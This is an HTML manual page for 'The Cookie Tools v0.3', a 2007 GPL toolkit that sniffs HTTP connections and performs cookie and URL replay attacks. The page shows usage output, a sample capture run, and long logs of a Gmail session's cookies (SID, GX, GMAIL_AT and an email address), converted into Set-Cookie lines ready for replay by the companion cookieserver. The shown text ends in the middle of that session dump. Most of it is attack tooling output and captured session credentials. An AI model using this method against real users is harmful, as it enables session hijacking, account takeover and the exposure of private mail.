@@ -1,0 +1,663 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<!--Converted with LaTeX2HTML 2002-2-1 (1.71)
+original version by:  Nikos Drakos, CBLU, University of Leeds
+* revised and updated by:  Marcus Hennecke, Ross Moore, Herb Swan
+* with significant contributions from:
+  Jens Lippmann, Marek Rouchal, Martin Wilck and others -->
+<HTML>
+<HEAD>
+<TITLE>The Cookie Tools v0.3</TITLE>
+<META NAME="description" CONTENT="The Cookie Tools v0.3">
+<META NAME="keywords" CONTENT="cookietools_en">
+<META NAME="resource-type" CONTENT="document">
+<META NAME="distribution" CONTENT="global">
+
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
+<META NAME="Generator" CONTENT="LaTeX2HTML v2002-2-1">
+<META HTTP-EQUIV="Content-Style-Type" CONTENT="text/css">
+
+<LINK REL="STYLESHEET" HREF="cookietools_en.css">
+
+</HEAD>
+
+<BODY >
+<H1 ALIGN="CENTER">The Cookie Tools v0.3</H1>
+<DIV CLASS="author_info">
+
+<P ALIGN="CENTER"><STRONG>xenion - Michele Dallachiesa</STRONG></P>
+<P ALIGN="CENTER"><I>michele dot dallachiesa at poste dot it</I></P>
+</DIV>
+<BR>
+
+<H2><A NAME="SECTION00010000000000000000">
+Contents</A>
+</H2>
+<!--Table of Contents-->
+
+<UL CLASS="TofC">
+<LI><A NAME="tex2html15"
+  HREF="cookietools_en.html#SECTION00020000000000000000">Introduction</A>
+<LI><A NAME="tex2html16"
+  HREF="cookietools_en.html#SECTION00030000000000000000">cookiesniffer</A>
+<UL>
+<LI><A NAME="tex2html17"
+  HREF="cookietools_en.html#SECTION00031000000000000000">Usage</A>
+<LI><A NAME="tex2html18"
+  HREF="cookietools_en.html#SECTION00032000000000000000">How it works</A>
+<LI><A NAME="tex2html19"
+  HREF="cookietools_en.html#SECTION00033000000000000000">The analyzers</A>
+<LI><A NAME="tex2html20"
+  HREF="cookietools_en.html#SECTION00034000000000000000">Dependencies, compilation and execution</A>
+</UL>
+<BR>
+<LI><A NAME="tex2html21"
+  HREF="cookietools_en.html#SECTION00040000000000000000">cookieserver</A>
+<UL>
+<LI><A NAME="tex2html22"
+  HREF="cookietools_en.html#SECTION00041000000000000000">Usage</A>
+<LI><A NAME="tex2html23"
+  HREF="cookietools_en.html#SECTION00042000000000000000">How it works</A>
+<LI><A NAME="tex2html24"
+  HREF="cookietools_en.html#SECTION00043000000000000000">Dependencies and execution</A>
+</UL>
+<BR>
+<LI><A NAME="tex2html25"
+  HREF="cookietools_en.html#SECTION00050000000000000000">Links</A>
+</UL>
+<!--End of Table of Contents-->
+<P>
+
+<H1><A NAME="SECTION00020000000000000000">
+Introduction</A>
+</H1>
+With those tools you can intercept and log the headers of any HTTP connection (Cookies, URLs, ...), analyze the gathered information and perform the (cookie|URL) replay attack in few seconds. As far as I know, this is the most advanced project (released under license GPL version 2) that plays those games. For updates and other cool stuff, see &#167;<A HREF="#Links">4</A>.
+
+<P>
+
+<H1><A NAME="SECTION00030000000000000000">
+cookiesniffer</A>
+</H1>
+cookiesniffer is a simple and powerful cookie sniffer that recognizes (through heuristics) and reconstructs (through libnids) new and existing HTTP connections, parsing any valid or partially valid HTTP message. The output is a set of files containing the gathered information with time-stamps in a format that can be trivially searched and parsed with standard UNIX tools such as grep, awk, cut and sed. It supports wireless (AP_DLT_IEEE802_11) networks.
+
+<P>
+
+<H2><A NAME="SECTION00031000000000000000">
+Usage</A>
+</H2>
+The unique mandatory input parameter is the packet source (network interface or pcap file). This is the list of the accepted parameters, it should be quite self-explicative:
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ ./bin/cookiesniffer                
+Copyright (c) 2007 Dallachiesa Michele &lt;micheleDOTdallachiesaATposteDOTit&gt;
+cookiesniffer of the Cookie Tools v0.3. The Cookie Tools are free software,
+covered by the GNU General Public License version 2.
+
+USAGE: cookiesniffer (-r|-i) &lt;source&gt; [options]
+
+ INPUT
+
+  -r &lt;str&gt;      Read packets from file (pcap format) &lt;str&gt;
+  -i &lt;str&gt;      Read packets from network interface &lt;str&gt;
+  -L &lt;int&gt;      Force datalink header length == &lt;int&gt;
+
+ OUTPUT
+
+  -d &lt;str&gt;      Set output directory to &lt;str&gt; (def: '.')
+  -s            Save packets to 'x/pkts.y.pcap'
+  -f            Disable stdout logging
+  -F            Enable syslog logging
+  -v            Be verbose
+
+ SELECT
+
+  -m            Sniff in promiscuous mode
+  -p &lt;str&gt;      Add pcap filter &lt;str&gt;
+
+ EXECUTION
+
+  -Z &lt;str&gt;      Run as user &lt;str&gt;
+  -D            Run in background (option -f implicit)
+
+ MISC
+
+  -0            Disable single packet handling (may cause information loss)
+  -h            This
+
+xenion@gollum:~/dev/cookietools$
+</PRE>
+
+<P>
+This is an example of execution (get packets from network interface eth0 using 'logz' as output directory, while surfing on mail.google.com and bbc.com):
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ mkdir logz
+xenion@gollum:~/dev/cookietools$ sudo ./bin/cookiesniffer -i eth0 -d logz
+ + cookiesniffer of The Cookie Tools v0.3 running here!
+ + pid: 15867, date/time: 21/11/2007#11:31:39
+ + Configuration
+   + INPUT
+     Packet source: iface 'eth0'
+     Force datalink header length: disabled
+   + OUTPUT
+     Output directory: 'logz'
+     Logfile: 'logz/0.txt'
+     Save pcap: disabled
+     stdout logging: enabled
+     Syslog logging: disabled
+     Be verbose: disabled
+   + SELECT
+     Sniff in promiscuous mode: disabled
+     Add pcap filter: disabled
+   + EXECUTION
+     Running as user/group: root/root
+     Running daemonized: disabled
+     Single packet handling: enabled
+ * You can dump stats sending me a SIGUSR2 signal
+ * Reading packets...
+ ! handling single HTTP pkt: 192.168.1.2:47260 &gt; 72.14.221.19:80
+ ! handling single HTTP pkt: 72.14.221.19:80 &gt; 192.168.1.2:47260
+ ! handling single HTTP pkt: 192.168.1.2:47255 &gt; 72.14.221.19:80
+ ! handling single HTTP pkt: 72.14.221.19:80 &gt; 192.168.1.2:47255
+ ! handling single HTTP pkt: 192.168.1.2:47260 &gt; 72.14.221.19:80
+ ! handling single HTTP pkt: 72.14.221.19:80 &gt; 192.168.1.2:47260
+ ! handling single HTTP pkt: 192.168.1.2:47255 &gt; 72.14.221.19:80
+ ! handling single HTTP pkt: 72.14.221.19:80 &gt; 192.168.1.2:47255
+ ! handling single HTTP pkt: 192.168.1.2:47260 &gt; 72.14.221.19:80
+ ! handling single HTTP pkt: 72.14.221.19:80 &gt; 192.168.1.2:47260
+ ! observing HTTP conn: 192.168.1.2:44048 &gt; 212.58.224.125:80
+ ! observing HTTP conn: 192.168.1.2:57767 &gt; 212.58.253.72:80
+ ! observing HTTP conn: 192.168.1.2:40400 &gt; 62.189.244.254:80
+ ! observing HTTP conn: 192.168.1.2:43955 &gt; 209.62.178.57:80
+ ! observing HTTP conn: 192.168.1.2:43956 &gt; 209.62.178.57:80
+ ! observing HTTP conn: 192.168.1.2:43957 &gt; 209.62.178.57:80
+ ! observing HTTP conn: 192.168.1.2:43958 &gt; 209.62.178.57:80
+ ! observing HTTP conn: 192.168.1.2:55713 &gt; 209.62.176.52:80
+</PRE>
+
+<P>
+You can also get some statistics sending to the process a SIGUSR2 signal. This is the resulting output directory:
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ ls logz
+192.168.1.2-209.62.176.52.session   192.168.1.2-212.58.253.72.txt
+192.168.1.2-209.62.176.52.txt       192.168.1.2-62.189.244.254.session
+192.168.1.2-209.62.178.57.session   192.168.1.2-62.189.244.254.txt
+192.168.1.2-209.62.178.57.txt       192.168.1.2-72.14.221.19.session
+192.168.1.2-212.58.224.125.session  192.168.1.2-72.14.221.19.txt
+192.168.1.2-212.58.224.125.txt      log.0.txt
+192.168.1.2-212.58.253.72.session
+xenion@gollum:~/dev/cookietools$
+</PRE>
+
+<P>
+This is the execution 0 (the first execution) and the file log.0.txt contains the execution log. Each tracked connection has 2 files: The clientip-serverip.txt file contains information you can easily read, the clientip-serverip.session file contains information cookieserver can easily parse. Note that in the session file the "Cookie" HTTP headers are transformed in "Set-Cookie" HTTP headers  using as path "/", as expires "Tuesday, 2-Feb-2020 02:02:02 GMT" and as domain the top domain extracted from the "Host" HTTP header or from the requested URL. This maximizes the power of cookieserver. The session file contains also the retrieved URLs (they can contain relevant information about the session).  Those are the logs of the connections from 192.168.1.2 (client) to 66.249.91.19 (server):
+
+<P>
+<PRE>
+xenion@gollum:~/dev/cookietools$ cat logz/192.168.1.2-72.14.221.19.txt
+pktcount=4 time=21/11/2007#11:31:41.239263 src=192.168.1.2:47260 dst=72.14.221.19:80
+s POST /mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=9&amp;SID=B7BBE82A5077EC37&amp;RID=89041&amp;zx=it9k92y1rgwv&amp;t=1 HTTP/1.1
+h Host: mail.google.com
+h User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.8-1)
+h Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+h Accept-Language: en-us,en;q=0.5
+h Accept-Encoding: gzip,deflate
+h Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+h Keep-Alive: 300
+h Connection: keep-alive
+h Content-Type: application/x-www-form-urlencoded
+h Referer: http://mail.google.com/mail/
+h Content-Length: 35
+c0 type=Cookie
+c0 name='__utma' value='173272373.1523618165.1195636735.1195636735.1195636735.1'
+c0 name='__utmc' value='173272373'
+c0 name='__utmz' value='173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral'
+c0 name='GX' value='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+c0 name='S' value='gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y'
+c0 name='GMAIL_AT' value='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+c0 name='gmailchat' value='charlieroot69@gmail.com/138671'
+c0 name='TZ' value='-60'
+c0 name='GMAIL_RTT' value='121'
+c0 name='GMAIL_LOGIN' value='T1195636734978/1195636734978/1195636738633'
+
+pktcount=13 time=21/11/2007#11:31:41.555086 src=192.168.1.2:47260 dst=72.14.221.19:80
+s HTTP/1.1 200 OK
+h Cache-control: no-cache
+h Pragma: no-cache
+h Content-Type: text/html; charset=UTF-8
+h ETag: 
+h Content-Encoding: gzip
+h Content-Length: 26
+h Server: GFE/1.3
+h Date: Wed, 21 Nov 2007 10:31:42 GMT
+
+pktcount=17 time=21/11/2007#11:31:42.446297 src=192.168.1.2:47255 dst=72.14.221.19:80
+s GET /mail/?ui=2&amp;ik=a70d6eca1f&amp;view=tl&amp;start=0&amp;num=70&amp;rt=h&amp;search=inbox HTTP/1.1
+h Host: mail.google.com
+h User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.8-1)
+h Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+h Accept-Language: en-us,en;q=0.5
+h Accept-Encoding: gzip,deflate
+h Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+h Keep-Alive: 300
+h Connection: keep-alive
+h Referer: http://mail.google.com/mail/
+c0 type=Cookie
+c0 name='__utma' value='173272373.1523618165.1195636735.1195636735.1195636735.1'
+c0 name='__utmc' value='173272373'
+c0 name='__utmz' value='173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral'
+c0 name='GX' value='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+c0 name='S' value='gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y'
+c0 name='GMAIL_AT' value='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+c0 name='gmailchat' value='charlieroot69@gmail.com/138671'
+c0 name='TZ' value='-60'
+c0 name='GMAIL_RTT' value='121'
+c0 name='GMAIL_LOGIN' value='T1195636734978/1195636734978/1195636738633'
+c0 name='SID' value='DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF'
+
+pktcount=21 time=21/11/2007#11:31:42.699130 src=192.168.1.2:47255 dst=72.14.221.19:80
+s HTTP/1.1 200 OK
+h Cache-control: no-cache, no-store
+h Pragma: no-cache
+h Content-Type: text/html; charset=UTF-8
+h Content-Encoding: gzip
+h Content-Length: 919
+h Server: GFE/1.3
+h Date: Wed, 21 Nov 2007 10:31:43 GMT
+
+pktcount=23 time=21/11/2007#11:31:42.972861 src=192.168.1.2:47260 dst=72.14.221.19:80
+s GET /mail/?ui=2&amp;ik=a70d6eca1f&amp;view=ad&amp;ak=s6cmkdkein1jmp2a91ddp8yun54n24w HTTP/1.1
+h Host: mail.google.com
+h User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.8-1)
+h Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+h Accept-Language: en-us,en;q=0.5
+h Accept-Encoding: gzip,deflate
+h Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+h Keep-Alive: 300
+h Connection: keep-alive
+h Referer: http://mail.google.com/mail/
+c0 type=Cookie
+c0 name='__utma' value='173272373.1523618165.1195636735.1195636735.1195636735.1'
+c0 name='__utmc' value='173272373'
+c0 name='__utmz' value='173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral'
+c0 name='GX' value='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+c0 name='S' value='gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y'
+c0 name='GMAIL_AT' value='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+c0 name='gmailchat' value='charlieroot69@gmail.com/138671'
+c0 name='TZ' value='-60'
+c0 name='GMAIL_RTT' value='121'
+c0 name='GMAIL_LOGIN' value='T1195636734978/1195636734978/1195636738633'
+c0 name='SID' value='DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF'
+
+pktcount=27 time=21/11/2007#11:31:43.196161 src=192.168.1.2:47260 dst=72.14.221.19:80
+s HTTP/1.1 200 OK
+h Cache-control: no-cache, no-store
+h Pragma: no-cache
+h Content-Type: text/javascript; charset=UTF-8
+h Content-Encoding: gzip
+h Content-Length: 764
+h Server: GFE/1.3
+h Date: Wed, 21 Nov 2007 10:31:43 GMT
+
+pktcount=29 time=21/11/2007#11:31:46.113463 src=192.168.1.2:47255 dst=72.14.221.19:80
+s POST /mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=1552&amp;SID=B7BBE82A5077EC37&amp;RID=89042&amp;zx=d7qazjopodh6&amp;t=1 HTTP/1.1
+h Host: mail.google.com
+h User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.8-1)
+h Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+h Accept-Language: en-us,en;q=0.5
+h Accept-Encoding: gzip,deflate
+h Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+h Keep-Alive: 300
+h Connection: keep-alive
+h Content-Type: application/x-www-form-urlencoded
+h Referer: http://mail.google.com/mail/
+h Content-Length: 35
+c0 type=Cookie
+c0 name='__utma' value='173272373.1523618165.1195636735.1195636735.1195636735.1'
+c0 name='__utmc' value='173272373'
+c0 name='__utmz' value='173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral'
+c0 name='GMAIL_STAT_PENDING' value='/S:a=lc&amp;sv=tl&amp;ev=tl&amp;s=25&amp;t=1637&amp;w=623&amp;'
+c0 name='GX' value='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+c0 name='S' value='gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y'
+c0 name='GMAIL_AT' value='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+c0 name='gmailchat' value='charlieroot69@gmail.com/138671'
+c0 name='TZ' value='-60'
+c0 name='GMAIL_RTT' value='121'
+c0 name='GMAIL_LOGIN' value='T1195636734978/1195636734978/1195636738633'
+
+pktcount=35 time=21/11/2007#11:31:46.626738 src=192.168.1.2:47255 dst=72.14.221.19:80
+s HTTP/1.1 200 OK
+h Cache-control: no-cache
+h Pragma: no-cache
+h Content-Type: text/html; charset=UTF-8
+h ETag: 
+h Content-Encoding: gzip
+h Content-Length: 26
+h Server: GFE/1.3
+h Date: Wed, 21 Nov 2007 10:31:47 GMT
+
+pktcount=38 time=21/11/2007#11:31:50.984025 src=192.168.1.2:47260 dst=72.14.221.19:80
+s GET /mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=6425&amp;SID=B7BBE82A5077EC37&amp;RID=89043&amp;TYPE=terminate&amp;zx=eh281lp7e4it HTTP/1.1
+h Host: mail.google.com
+h User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.8-1)
+h Accept: image/png,*/*;q=0.5
+h Accept-Language: en-us,en;q=0.5
+h Accept-Encoding: gzip,deflate
+h Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+h Keep-Alive: 300
+h Connection: keep-alive
+h Referer: http://mail.google.com/mail/
+c0 type=Cookie
+c0 name='__utma' value='173272373.1523618165.1195636735.1195636735.1195636735.1'
+c0 name='__utmc' value='173272373'
+c0 name='__utmz' value='173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral'
+c0 name='GMAIL_STAT_PENDING' value='/S:a=lc&amp;sv=tl&amp;ev=tl&amp;s=25&amp;t=1637&amp;w=623&amp;'
+c0 name='GX' value='DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v'
+c0 name='S' value='gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y'
+c0 name='GMAIL_AT' value='xn3j37i0ev7wcknl8mwn6svd7dl85s'
+c0 name='gmailchat' value='charlieroot69@gmail.com/138671'
+c0 name='TZ' value='-60'
+c0 name='GMAIL_RTT' value='121'
+c0 name='GMAIL_LOGIN' value='T1195636734978/1195636734978/1195636738633'
+c0 name='SID' value='DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF'
+
+pktcount=44 time=21/11/2007#11:31:51.203587 src=192.168.1.2:47260 dst=72.14.221.19:80
+s HTTP/1.1 200 OK
+h Cache-control: no-cache
+h Pragma: no-cache
+h Content-Type: text/html; charset=UTF-8
+h ETag: 
+h Content-Length: 0
+h Server: GFE/1.3
+h Date: Wed, 21 Nov 2007 10:31:51 GMT
+
+xenion@gollum:~/dev/cookietools$ cat logz/192.168.1.2-72.14.221.19.session 
+1195641101.239263 Link: http://mail.google.com/mail/channel/bind?at=xn3j37i0ev7wcknl8mwn6svd7dl85s&amp;VER=5&amp;it=9&amp;SID=B7BBE82A5077EC37&amp;RID=89041&amp;zx=it9k92y1rgwv&amp;t=1
+1195641101.239263 Set-Cookie: __utma=173272373.1523618165.1195636735.1195636735.1195636735.1; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: __utmc=173272373; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: __utmz=173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: S=gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: GMAIL_AT=xn3j37i0ev7wcknl8mwn6svd7dl85s; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: gmailchat=charlieroot69@gmail.com/138671; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: TZ=-60; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: GMAIL_RTT=121; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641101.239263 Set-Cookie: GMAIL_LOGIN=T1195636734978/1195636734978/1195636738633; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Link: http://mail.google.com/mail/?ui=2&amp;ik=a70d6eca1f&amp;view=tl&amp;start=0&amp;num=70&amp;rt=h&amp;search=inbox
+1195641102.446297 Set-Cookie: __utma=173272373.1523618165.1195636735.1195636735.1195636735.1; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: __utmc=173272373; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: __utmz=173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: S=gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: GMAIL_AT=xn3j37i0ev7wcknl8mwn6svd7dl85s; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: gmailchat=charlieroot69@gmail.com/138671; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: TZ=-60; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: GMAIL_RTT=121; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: GMAIL_LOGIN=T1195636734978/1195636734978/1195636738633; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.446297 Set-Cookie: SID=DQAAAGwAAACE2b7aSYrQhQLPo-6CPWyHxwgtAQHWvHMkNNlhgioxnGVZ94fyOyP0DHOY9vDqO9uOQSgvNO3B3g4beCKYNbek6PctrTdrUjNKfGuFk_Z_kdFYB72TlLsL8HututH5PNMSHkFXIC8A0510ugE1g0qF; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Link: http://mail.google.com/mail/?ui=2&amp;ik=a70d6eca1f&amp;view=ad&amp;ak=s6cmkdkein1jmp2a91ddp8yun54n24w
+1195641102.972861 Set-Cookie: __utma=173272373.1523618165.1195636735.1195636735.1195636735.1; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: __utmc=173272373; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: __utmz=173272373.1195636735.1.1.utmccn=(referral)|utmcsr=mail.google.com|utmcct=/mail/|utmcmd=referral; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: GX=DQAAAG8AAACjafoPn5mnL_8MJW1nVv5YXx3DKtO9FNCcs9XOGqKcKQ3sUbDCPajbczMVOxCS39raD7wjL5G000VJRQ-BvBJtwX-t1mWdXCyGp9LOWfrnjGeSx5OpA2o2JFJDSRF_puHr_a7stqXQjUqdZGBJkB9v; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: S=gmail=L0lNcfSZrxf9zS0_bnoG1g:gmail_yj=j8AXLSaEdnrRWXL9Mck0Yw:gmproxy=aULplbxy37k:gmproxy_yj=Ozc4CqRZ6RY:gmproxy_yj_sub=eGfjrGPBT6Y; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: GMAIL_AT=xn3j37i0ev7wcknl8mwn6svd7dl85s; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: gmailchat=charlieroot69@gmail.com/138671; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: TZ=-60; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: GMAIL_RTT=121; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
+1195641102.972861 Set-Cookie: GMAIL_LOGIN=T1195636734978/1195636734978/1195636738633; expires=Tuesday, 2-Feb-2020 02:02:02 GMT; path=/; domain=google.com;
